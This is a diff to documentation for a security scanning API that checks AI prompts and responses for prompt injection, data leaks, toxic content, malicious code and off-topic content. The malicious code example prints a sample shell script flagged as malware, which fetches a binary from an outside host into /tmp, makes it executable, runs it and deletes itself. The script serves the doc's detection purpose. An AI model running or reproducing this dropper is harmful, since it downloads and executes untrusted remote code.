@@ -1,6 +1,6 @@
 ---
 id: usecases
-title: "Use Cases: Prisma AIRS API"
+title: "Use Cases: Prisma AIRS AI Runtime API Intercept"
 sidebar_label: "Scan APIs Use Cases"
 keywords:
   - AIRS
@@ -11,14 +11,14 @@ keywords:
   - API
 ---
 
-This document outlines key use cases for Prisma AIRS API detection features.
+This document outlines key use cases for Prisma AIRS AI Runtime API detection features.
 Each use case includes the sample code or API requests, API security profile configurations, along with the expected responses. The use cases demonstrate how to leverage Prisma AIRS API for enhanced protection.
 
 ## Prerequisites
 
 Before you begin,
 
-1. Refer to the prerequsities section in the [Prisma AIRS API](airuntimesecurityapi.md) overview page.
+1. Refer to the prerequsities section in the [Prisma AIRS AI Runtime API](airuntimesecurityapi.md) overview page.
 2. Review the Scan API Endpoints in the Scan API Endpoints overview page.
 3. Configure the API security profile with below settings for the respective use cases:
 
@@ -37,6 +37,7 @@ For details on the protections and the features available while creating an API 
 ## Use Cases
 
 ### Detect Prompt Injection
+
 <details>
   <summary>Detect Prompt Injection</summary>
 
@@ -118,12 +119,13 @@ curl -L 'https://service.api.aisecurity.paloaltonetworks.com/v1/scan/sync/reques
 --data '{
  "tr_id": "1234",
  "ai_profile": { // You can enter one of the following: profile_id or profile_name
-   "profile_id": "4597dc2b-0000-4e5a-a1da-fd0fe0e948df",
+   "profile_id": "00000000-0000-0000-0000-000000000000",
    "profile_name": "dummy-profile"
  },
  "metadata": {
    "app_user": "test-user-2",
-   "ai_model": "Test AI model"
+   "ai_model": "Test AI model",
+   "user_ip": "10.5.0.2"
  },
  "contents": [ # You can enter one of the following - prompt or response
    {
@@ -141,16 +143,16 @@ The response indicates a malicious URL detected with the `response_detected.url_
 {
   "action": "block",
   "category": "malicious",
-  "profile_id": "4597dc2b-d34c-0000-a1da-fd0fe0e948df",
+  "profile_id": "00000000-0000-0000-0000-000000000000",
   "profile_name": "dummy-profile",
   "prompt_detected": {},
-  "report_id": "Rd7c92c2a-02ce-0000-8e85-6d0f9eeb5ef8",
+  "report_id": "R00000000-0000-0000-0000-000000000000",
   "response_detected": {
     "db_security": false,
     "dlp": false,
     "url_cats": true
   },
-  "scan_id": "d7c92c2a-02ce-0000-8e85-6d0f9eeb5ef8",
+  "scan_id": "00000000-0000-0000-0000-000000000000",
   "tr_id": "1234"
 }
 ```
@@ -318,7 +320,7 @@ Review the API scan logs for masked sensitive detection indicated by the “Cont
       }
     ]
   },
-  "report_id": "R90484606-6d70-4522-8f0c-c93d878c9a5c",
+  "report_id": "R00000000-0000-0000-0000-000000000000",
   "response_detected": {
     "dlp": true
   },
@@ -364,7 +366,7 @@ Review the API scan logs for masked sensitive detection indicated by the “Cont
     ]
   },
   "scan_id": "90484606-6d70-4522-8f0c-c93d878c9a5c",
-  "tr_id": "1111"
+  "tr_id": "1111" 
 }
 ```
 
@@ -463,7 +465,7 @@ The start and end offset character indexes enable the DLP service to selectively
             "data_pattern_rule2_verdict": "",
             "dlp_profile_id": "11995025",
             "dlp_profile_name": "Sensitive Content",
-            "dlp_report_id": "598936C508B5AD43CC7AC86789502422AA311B95E32107EFD316ABA51AA71FAC"
+            "dlp_report_id": "0000000000000000000000000000000000000000000000000000000000000000"
           }
         },
         "verdict": "malicious"
@@ -594,20 +596,20 @@ The specific action shown in the response is based on your API security profile 
 {
   "action": "block",
   "category": "malicious",
-  "profile_id": "8c8fdf8b-d494-0000-ba54-c16120c4ef0b",
+  "profile_id": "00000000-0000-0000-0000-000000000000",
   "profile_name": "ai-sec-db-security",
   "prompt_detected": {
     "dlp": false,
     "injection": false,
     "url_cats": false
   },
-  "report_id": "R6be7d63b-0000-47c2-a4e7-6046d18682dc",
+  "report_id": "R00000000-0000-0000-0000-000000000000",
   "response_detected": {
     "db_security": true,
     "dlp": false,
     "url_cats": false
   },
-  "scan_id": "6be7d63b-0000-47c2-a4e7-6046d18682dc",
+  "scan_id": "00000000-0000-0000-0000-000000000000",
   "tr_id": "1134"
 }
 ```
@@ -674,7 +676,7 @@ Below is the detailed report response from the `v1/scan/reports` API endpoint fo
             "data_pattern_rule2_verdict": "",
             "dlp_profile_id": "00000000",
             "dlp_profile_name": "PII - Basic",
-            "dlp_report_id": "000002C5D89B846B21942943D46D80C973F8959DF0423C5D23E2AC96B2A06575"
+            "dlp_report_id": "0000000000000000000000000000000000000000000000000000000000000000"
           }
         },
         "verdict": "benign"
@@ -689,9 +691,9 @@ Below is the detailed report response from the `v1/scan/reports` API endpoint fo
         "verdict": "benign"
       }
     ],
-    "report_id": "R6be7d63b-0000-47c2-a4e7-6046d18682dc",
+    "report_id": "R00000000-0000-0000-0000-000000000000",
     "req_id": 0,
-    "scan_id": "6be7d63b-0000-47c2-a4e7-6046d18682dc",
+    "scan_id": "00000000-0000-0000-0000-000000000000",
     "transaction_id": "1134"
   }
 ]
@@ -704,7 +706,7 @@ Below is the detailed report response from the `v1/scan/reports` API endpoint fo
 <details>
 <summary>Detect Toxic Content</summary>
 The toxic content detection is for LLM models and securing them from generating or responding to inappropriate content.
-The following sync request sends a prompt containing potentially toxic content to the AI Runtime Security: API intercept for analysis.
+The following sync request sends a prompt containing potentially toxic content to Prisma AIRS APIs for analysis.
 Enable **Toxic Content Detection** in the API security profile for this detection.
 
 ```curl
@@ -769,7 +771,7 @@ It supports multiple languages including, Javascript, Python, VBScript, Powershe
 - Combine multiple snippets of the same language type into one
 - If the response contains multiple language snippets, invoke a separate API with each language.
 
-The following cURL request calls the AI Runtime scan API with a Python-based malicious code snippet to test the output generated by your LLM models.
+The following cURL request calls the Prisma AIRS AI Runtime scan API with a Python-based malicious code snippet to test the output generated by your LLM models.
 
 Enable **Malicious Code Detection** in the API security profile to enable this detection.
 
@@ -795,55 +797,115 @@ curl -L 'https://service.api.aisecurity.paloaltonetworks.com/v1/scan/sync/reques
 
 **Output**
 
-The scan API output confirms this is a malicious code threat (`malicious_code: true`). The action threat is  `block` based on your API security profile settings.
+The scan API output confirms this is a malicious code threat (`malicious_code: true`). The action is set to `block` based on your API security profile settings.
 
 ```json
 {
-  "action": "block",
-  "category": "malicious",
-  "profile_id": "00000000-8a28-41a5-8e5a-2476377543ac",
-  "profile_name": "malicious-code-detection",
-  "prompt_detected": {},
-  "report_id": "000000000-ea0d-4b33-85ff-21fe55334457",
-  "response_detected": {
-    "malicious_code": true
-  },
-  "scan_id": "00000000-ea0d-4b33-85ff-21fe55334457",
-  "tr_id": "1111"
+   "action" : "block",
+   "category" : "malicious",
+   "profile_id" : "00000000-0000-0000-0000-000000000000",
+   "profile_name" : "test-qa-ui-XXX",
+   "prompt_detected" : {
+      "dlp" : false,
+      "injection" : false,
+      "malicious_code" : true,
+      "toxic_content" : false,
+      "url_cats" : false
+   },
+   "report_id" : "R00000000-0000-0000-0000-000000000000",
+   "response_detected" : {},
+   "scan_id" : "00000000-0000-0000-0000-000000000000",
+   "tr_id" : "1628"
 }
 ```
 
-For a detailed report, trigger the v1/scan/reports API endpoint with the report_id printed in the above output and record the SHA-256 of the malicious code for analysis.
+For a detailed report, trigger the `v1/scan/reports` API endpoint with the report_id printed in the above output.
+The malicious code report shows:
+
+- All the code snippets that are extracted from the prompt or response as part of the `all_code_blocks` array output.
+- The `SHA-256` ID and the `file_type` of the code, which was analyzed for malware detection.
 
 ```json
-[
-  {
-    "detection_results": [
+{
+   "detection_results" : [
       {
-        "action": "block",
-        "data_type": "response",
-        "detection_service": "malicious_code",
-        "result_detail": {
-          "mc_report": {
-            "code_info": [
-              {
-                "code_sha256": "0000000000007656444838523440999d85604148430db2a4a6fcb41094e9478b
-",
-                "file_type": "Python Script"
-              }
-            ],
-            "verdict": "malicious"
-          }
-        },
-        "verdict": "malicious"
+         "action" : "allow",
+         "data_type" : "prompt",
+         "detection_service" : "dlp",
+         "result_detail" : {
+            "dlp_report" : {
+               "data_pattern_rule1_verdict" : "NOT_MATCHED",
+               "data_pattern_rule2_verdict" : "",
+               "dlp_profile_id" : "00000000",
+               "dlp_profile_name" : "Sensitive Content",
+               "dlp_report_id" : "000000000000000000000000000000000000000000000000000000000000000"
+            }
+         },
+         "verdict" : "benign"
+      },
+      {
+         "action" : "allow",
+         "data_type" : "prompt",
+         "detection_service" : "malicious_code",
+         "result_detail" : {
+            "mc_report" : {
+               "all_code_blocks" : [
+                  "#!/bin/sh\n\nrm -rf $0\ncd /\nwget https://website.com/sp/lp -O /tmp/b\nchmod 777 /tmp/b\ncd /tmp\n./b\nrm -rf /tmp/b\nexit 0"
+               ],
+               "code_analysis_by_type" : [
+                  {
+                     "code_sha256" : "00000000000000000000000000000000000000000000000000000000000000000",
+                     "file_type" : "Shell"
+                  }
+               ],
+               "verdict" : "malicious"
+            }
+         },
+         "verdict" : "malicious"
+      },
+      {
+         "action" : "allow",
+         "data_type" : "prompt",
+         "detection_service" : "pi",
+         "result_detail" : {},
+         "verdict" : "benign"
+      },
+      {
+         "action" : "allow",
+         "data_type" : "prompt",
+         "detection_service" : "tc",
+         "result_detail" : {
+            "tc_report" : {
+               "confidence" : "",
+               "verdict" : "benign"
+            }
+         },
+         "verdict" : "benign"
+      },
+      {
+         "action" : "allow",
+         "data_type" : "prompt",
+         "detection_service" : "uf",
+         "result_detail" : {
+            "urlf_report" : [
+               {
+                  "action" : "allow",
+                  "categories" : [
+                     "malware"
+                  ],
+                  "risk_level" : "Not Given",
+                  "url" : "https://website.com/sp/lp"
+               }
+            ]
+         },
+         "verdict" : "benign"
       }
-    ],
-    "report_id": "000000000-ea0d-4b33-85ff-21fe55334457",
-    "req_id": 0,
-    "scan_id": "00000000-ea0d-4b33-85ff-21fe55334457",
-    "transaction_id": "1111"
-  }
-]
+   ],
+   "report_id" : "0000000000-0000-0000-0000-000000000000",
+   "req_id" : 0,
+   "scan_id" : "00000000-0000-0000-0000-000000000000",
+   "transaction_id" : "1111"
+}
 ```
 
 </details>
@@ -857,6 +919,7 @@ The following async curl request scans an AI application running on an AI Agent 
 Create or update your API security profile by enabling **AI Agent Protection**.
 
 v1/scan/async/request
+
 ```curl
 curl -L 'https://service.api.aisecurity.paloaltonetworks.com/v1/scan/async/request' \
 -H 'Content-Type: application/json' \
@@ -907,8 +970,8 @@ The async output with report_id and scan_id:
 ```curl
 {
   "received": "2025-05-08T15:54:21.922531408Z",
-  "report_id": "R1737a162-8c89-4a18-a84c-fd7f635d018f",
-  "scan_id": "1737a162-8c89-4a18-a84c-fd7f635d018f"
+  "report_id": "R00000000-0000-0000-0000-000000000000",
+  "scan_id": "00000000-0000-0000-0000-000000000000"
 }
 ```
 
@@ -937,9 +1000,9 @@ Both requests were blocked according to the security profile settings.
         "verdict": "malicious"
       }
     ],
-    "report_id": "R87a8577f-7b89-41fe-acc6-48e1bd7944d7",
+    "report_id": "R00000000-0000-0000-0000-000000000000",
     "req_id": 1,
-    "scan_id": "87a8577f-7b89-41fe-acc6-48e1bd7944d7",
+    "scan_id": "00000000-0000-0000-0000-000000000000",
     "transaction_id": "2882"
   },
   {
@@ -963,9 +1026,9 @@ Both requests were blocked according to the security profile settings.
         "verdict": "malicious"
       }
     ],
-    "report_id": "R87a8577f-7b89-41fe-acc6-48e1bd7944d7",
+    "report_id": "R00000000-0000-0000-0000-000000000000",
     "req_id": 2,
-    "scan_id": "87a8577f-7b89-41fe-acc6-48e1bd7944d7",
+    "scan_id": "00000000-0000-0000-0000-000000000000",
     "transaction_id": "2082"
   }
 ]
@@ -1045,8 +1108,8 @@ Async scan output:
 Scan result:
 {
   "received": "2025-05-08T12:36:58.056655917Z",
-  "report_id": "R4b350eef-15cc-4ff5-8ddc-de3114394aa5",
-  "scan_id": "4b350eef-15cc-4ff5-8ddc-de3114394aa5"
+  "report_id": "R00000000-0000-0000-0000-000000000000",
+  "scan_id": "00000000-0000-0000-0000-000000000000"
 }
 ```
 
@@ -1060,17 +1123,17 @@ Trigger `/v1/scan/results` endpoint with the above “scan_id” API output snip
       "action": "block",
       "category": "malicious",
       "completed_at": "2025-05-08T12:36:59Z",
-      "profile_id": "d3da1d16-207a-46f4-a6f6-0b65b32fe3f0",
+      "profile_id": "00000000-0000-0000-0000-000000000000",
       "profile_name": "contextual-grounding-profile",
       "prompt_detected": {},
-      "report_id": "R4b350eef-15cc-4ff5-8ddc-de3114394aa5",
+      "report_id": "R00000000-0000-0000-0000-000000000000",
       "response_detected": {
         "ungrounded": true
       },
-      "scan_id": "4b350eef-15cc-4ff5-8ddc-de3114394aa5",
+      "scan_id": "00000000-0000-0000-0000-000000000000",
       "tr_id": "2082"
     },
-    "scan_id": "4b350eef-15cc-4ff5-8ddc-de3114394aa5",
+    "scan_id": "00000000-0000-0000-0000-000000000000",
     "status": "complete"
   },
   {
@@ -1079,17 +1142,17 @@ Trigger `/v1/scan/results` endpoint with the above “scan_id” API output snip
       "action": "allow",
       "category": "benign",
       "completed_at": "2025-05-08T12:36:59Z",
-      "profile_id": "d3da1d16-207a-46f4-a6f6-0b65b32fe3f0",
+      "profile_id": "00000000-0000-0000-0000-000000000000",
       "profile_name": "contextual-grounding-profile",
       "prompt_detected": {},
-      "report_id": "R4b350eef-15cc-4ff5-8ddc-de3114394aa5",
+      "report_id": "R00000000-0000-0000-0000-000000000000",
       "response_detected": {
         "ungrounded": false
       },
-      "scan_id": "4b350eef-15cc-4ff5-8ddc-de3114394aa5",
+      "scan_id": "00000000-0000-0000-0000-000000000000",
       "tr_id": "2882"
     },
-    "scan_id": "4b350eef-15cc-4ff5-8ddc-de3114394aa5",
+    "scan_id": "00000000-0000-0000-0000-000000000000",
     "status": "complete"
   }
 ]
@@ -1109,9 +1172,9 @@ Trigger `/v1/scan/results` endpoint with the above “scan_id” API output snip
         "verdict": "benign"
       }
     ],
-    "report_id": "R4b350eef-15cc-4ff5-8ddc-de3114394aa5",
+    "report_id": "R00000000-0000-0000-0000-000000000000",
     "req_id": 1,
-    "scan_id": "4b350eef-15cc-4ff5-8ddc-de3114394aa5",
+    "scan_id": "00000000-0000-0000-0000-000000000000",
     "transaction_id": "2882"
   },
   {
@@ -1124,9 +1187,9 @@ Trigger `/v1/scan/results` endpoint with the above “scan_id” API output snip
         "verdict": "malicious"
       }
     ],
-    "report_id": "R4b350eef-15cc-4ff5-8ddc-de3114394aa5",
+    "report_id": "R00000000-0000-0000-0000-000000000000",
     "req_id": 2,
-    "scan_id": "4b350eef-15cc-4ff5-8ddc-de3114394aa5",
+    "scan_id": "00000000-0000-0000-0000-000000000000",
     "transaction_id": "2082"
   }
 ]
@@ -1139,7 +1202,7 @@ Trigger `/v1/scan/results` endpoint with the above “scan_id” API output snip
 <details>
 <summary>Custom Topic Guardrails</summary>
 
-A sync scan API example shows how to use custom topic guardrails to detect and block content that violates your configured topic policies.
+The following sync scan API example shows how to use custom topic guardrails to detect and block content that violates your configured topic policies.
 
 ```curl
 curl -L 'https://service.api.aisecurity.paloaltonetworks.com/v1/scan/sync/request' \
@@ -1159,55 +1222,89 @@ curl -L 'https://service.api.aisecurity.paloaltonetworks.com/v1/scan/sync/reques
         {
             "prompt": "The exploration of Mars is driven by a multifaceted scientific curiosity. Primarily, scientists are interested in understanding Mars past habitability, searching for signs of past or present life, investigating the planet s geological evolution, and studying its climate and atmosphere. These studies can provide valuable insights into the formation and evolution of rocky planets in general, including our own Earth.  Furthermore, Mars offers a potential backup location for humanity should Earth become uninhabitable in the distant future. However, numerous technological hurdles impede human missions to Mars. These include the long duration of the journey 6-8 months each way, which exposes astronauts to prolonged radiation and the psychological effects of isolation. Developing reliable life support systems capable of functioning for years in a harsh environment poses a significant challenge. Landing heavy payloads safely on Mars is another obstacle, as is developing technologies for in-situ resource utilization ISRU to create propellant for the return trip, minimize mission mass, and build habitats. The potential health risks to astronauts from Martian dust, radiation, and low gravity also need further investigation and mitigation strategies
 ",
+           "response": "The exploration of Mars is driven by a multifaceted scientific curiosity. Primarily, scientists are interested in understanding Mars past habitability, searching for signs of past or present life, investigating the planet s geological evolution, and studying its climate and atmosphere. These studies can provide valuable insights into the formation and evolution of rocky planets in general, including our own Earth.  Furthermore, Mars offers a potential \"backup location\" for humanity should Earth become uninhabitable in the distant future.\n\nHowever, numerous technological hurdles impede human missions to Mars. These include the long duration of the journey (6-8 months each way), which exposes astronauts to prolonged radiation and the psychological effects of isolation. Developing reliable life support systems capable of functioning for years in a harsh environment poses a significant challenge. Landing heavy payloads safely on Mars is another obstacle, as is developing technologies for in-situ resource utilization (ISRU) to create propellant for the return trip, minimize mission mass, and build habitats. The potential health risks to astronauts from Martian dust, radiation, and low gravity also need further investigation and mitigation strategies."
         }
-    ],
-    "tr_id": 1234,
-    "profile_name": "custom-topic-guardrails-profile"
+    ]
 }'
 ```
 
-The scan response indicates "topic_violation".
+The scan response indicates `topic_violation: true`.
 
 ```curl
 {
-  "action": "block",
-  "category": "malicious",
-  "profile_id": "069c92dd-789e-4cf3-837b-f7a509ae6046",
-  "profile_name": "custom-topic-guardrails-profile",
-  "prompt_detected": {
-    "topic_violation": true
-  },
-  "report_id": "R7a38a3b6-f0c3-4fee-b651-12a02bdbd4e7",
-  "response_detected": {},
-  "scan_id": "7a38a3b6-f0c3-4fee-b651-12a02bdbd4e7",
-  "tr_id": "1111"
+    "action": "block",
+    "category": "malicious",
+    "profile_id": "00000000-0000-0000-0000-000000000000",
+    "profile_name": "custom-topic-guardrail",
+    "prompt_detected": {
+        "topic_violation": true
+    },
+    "prompt_detection_details": {
+        "topic_guardrails_details": {
+            "blocked_topics": [
+                "Astronomy and outer space exploration"
+            ]
+        }
+    },
+    "report_id": "R00000000-0000-0000-0000-000000000000",
+    "response_detected": {
+        "topic_violation": true
+    },
+    "response_detection_details": {
+        "topic_guardrails_details": {
+            "blocked_topics": [
+                "Astronomy and outer space exploration"
+            ]
+        }
+    },
+    "scan_id": "00000000-0000-0000-0000-000000000000",
+    "tr_id": "1111"
 }
 ```
 
-The scan report shows that the content violated the topic guardrails policy. The content didn't match any of the allowed topics or blocked topics, resulting in a "malicious" verdict and a block action.
+The scan report shows that the content violated the topic guardrails policy.
+The content prompt contains a topic from the blocked topic list, which causes the scan report to detect a topic violation threat and set the “verdict” to “malicious”.
 
 ```curl
 [
-  {
-    "detection_results": [
-      {
-        "action": "block",
-        "data_type": "prompt",
-        "detection_service": "topic_guardrails",
-        "result_detail": {
-          "topic_guardrails_report": {
-            "allowed_topic_list": "not_matched",
-            "blocked_topic_list": "not_matched"
-          }
-        },
-        "verdict": "malicious"
-      }
-    ],
-    "report_id": "R7a38a3b6-f0c3-4fee-b651-12a02bdbd4e7",
-    "req_id": 0,
-    "scan_id": "7a38a3b6-f0c3-4fee-b651-12a02bdbd4e7",
-    "transaction_id": "1111"
-  }
+    {
+        "detection_results": [
+            {
+                "action": "block",
+                "data_type": "prompt",
+                "detection_service": "topic_guardrails",
+                "result_detail": {
+                    "topic_guardrails_report": {
+                        "allowed_topic_list": "not_matched",
+                        "blockedTopics": [
+                            "Astronomy and outer space exploration"
+                        ],
+                        "blocked_topic_list": "matched"
+                    }
+                },
+                "verdict": "malicious"
+            },
+            {
+                "action": "block",
+                "data_type": "response",
+                "detection_service": "topic_guardrails",
+                "result_detail": {
+                    "topic_guardrails_report": {
+                        "allowed_topic_list": "not_matched",
+                        "blockedTopics": [
+                            "Astronomy and outer space exploration"
+                        ],
+                        "blocked_topic_list": "matched"
+                    }
+                },
+                "verdict": "malicious"
+            }
+        ],
+        "report_id": "R00000000-0000-0000-0000-000000000000",
+        "req_id": 0,
+        "scan_id": "00000000-0000-0000-0000-000000000000",
+        "transaction_id": "1111"
+    }
 ]
 ```
 
